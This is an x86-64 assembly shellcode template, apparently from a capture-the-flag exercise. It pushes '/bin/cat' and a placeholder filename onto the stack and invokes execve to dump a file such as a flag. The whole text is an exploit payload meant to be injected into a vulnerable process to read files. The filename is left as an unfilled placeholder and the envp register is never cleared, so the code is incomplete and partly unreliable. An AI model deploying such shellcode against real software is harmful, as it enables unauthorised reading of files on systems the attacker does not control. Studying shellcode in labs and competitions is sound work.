global _start

section .text
_start:
    ; push '/bin/cat/[filename]' with execve syscall (59)    

    xor rax, rax                    ; push null byte

    push rax                        ; end of string
    mov rdi, 0x7461632f6e69622f  
    push rdi
    mov rdi, rsp                    

    push rax                       ; push null byte
    mov rsi, 0x[filename hex]      ; push [file name] 
    push rsi
    mov rsi, rsp

    push rax                        ; null parameter       
    push rsi                        ; /flg.txt 
    push rdi                        ; /bin/cat  
    mov rsi, rsp                    ; {/bin/cat, /[filename], NULL}

    mov al, 0x3b                    
    syscall